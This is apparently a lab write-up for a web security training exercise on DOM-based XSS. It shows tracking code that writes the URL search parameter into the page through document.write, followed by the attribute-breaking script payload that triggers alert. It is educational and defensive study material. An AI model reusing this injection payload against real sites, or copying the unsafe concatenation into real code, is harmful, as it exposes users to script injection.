
# DOM XSS in document.write sink using source location.search

This lab demonstrates DOM-based XSS in search tracking: data from the URL's search parameter reaches a JavaScript sink. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


The search page accepts its query through the `/?search=` parameter:



<img width="727" height="232" alt="1" src="https://github.com/user-attachments/assets/7ba5b37e-1d56-4d2b-ae6f-d731edca6081" />


The relevant source code shows the sink where the URL-controlled value is written:

```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```



<img width="649" height="136" alt="2" src="https://github.com/user-attachments/assets/add373a7-b0a5-4b88-bf4d-f10b2cef36e1" />


The following payload triggers the alert in this lab:

```
"><script>alert(1)</script>
```




<img width="713" height="214" alt="3" src="https://github.com/user-attachments/assets/fa680476-4d23-467c-bbc5-af754d75d1d9" />
